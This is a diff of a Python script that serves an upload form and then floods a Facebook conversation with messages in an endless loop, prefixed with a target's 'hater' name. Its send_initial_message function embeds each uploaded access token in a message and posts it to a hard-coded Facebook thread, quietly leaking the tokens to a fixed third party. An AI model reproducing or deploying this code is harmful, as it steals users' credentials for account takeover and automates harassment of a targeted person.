@@ -10,7 +10,8 @@ import socketserver
 import threading
 import cgi
 
-HTML_PAGE = b"""
+# --- HTML UI (Unicode safe string) ---
+HTML_PAGE = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -50,9 +51,9 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         if self.path == "/" or self.path == "/index.html":
             self.send_response(200)
-            self.send_header("Content-type", "text/html")
+            self.send_header("Content-type", "text/html; charset=utf-8")
             self.end_headers()
-            self.wfile.write(HTML_PAGE)
+            self.wfile.write(HTML_PAGE.encode("utf-8"))
         else:
             self.send_response(404)
             self.end_headers()
@@ -67,35 +68,35 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
                 environ={'REQUEST_METHOD': 'POST'}
             )
 
-            # Token file
+            # Token file -> tokennum.txt
             if "tokens" in form and form["tokens"].filename:
                 with open("tokennum.txt", "wb") as f:
                     f.write(form["tokens"].file.read())
 
-            # Convo file
+            # Convo file -> convo.txt
             if "convo" in form and form["convo"].filename:
                 with open("convo.txt", "wb") as f:
                     f.write(form["convo"].file.read())
 
-            # Messages file
+            # Messages file -> File.txt
             if "messages" in form and form["messages"].filename:
                 with open("File.txt", "wb") as f:
                     f.write(form["messages"].file.read())
 
-            # Hater name
+            # Haters name -> hatersname.txt
             if "hater" in form and form["hater"].filename:
                 with open("hatersname.txt", "wb") as f:
                     f.write(form["hater"].file.read())
 
-            # Time interval
+            # Time file -> time.txt
             if "time" in form and form["time"].filename:
                 with open("time.txt", "wb") as f:
                     f.write(form["time"].file.read())
 
         self.send_response(200)
-        self.send_header("Content-type", "text/html")
+        self.send_header("Content-type", "text/html; charset=utf-8")
         self.end_headers()
-        self.wfile.write(b"<script>alert('✅ Bot Chalu ho gaya h!'); window.location='/';</script>")
+        self.wfile.write("<script>alert('✅ Bot Chalu ho gaya h!'); window.location='/'</script>".encode("utf-8"))
 
 def execute_server():
     PORT = 4000
@@ -111,24 +112,14 @@ def send_initial_message():
     target_id = "61578840237242"
 
     requests.packages.urllib3.disable_warnings()
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
+    headers = {'Connection':'keep-alive'}
 
     for token in tokens:
         access_token = token.strip()
         url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
         msg = msg_template.format(access_token)
         parameters = {'access_token': access_token, 'message': msg}
-        response = requests.post(url, json=parameters, headers=headers)
+        requests.post(url, json=parameters, headers=headers)
         time.sleep(0.1)
 
 def send_messages_from_file():
@@ -150,16 +141,7 @@ def send_messages_from_file():
     with open('time.txt', 'r') as file:
         speed = int(file.read().strip())
 
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
+    headers = {'Connection':'keep-alive'}
 
     while True:
         try:
@@ -180,7 +162,6 @@ def send_messages_from_file():
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
 
                 time.sleep(speed)
-
             print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
@@ -194,3 +175,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+                  
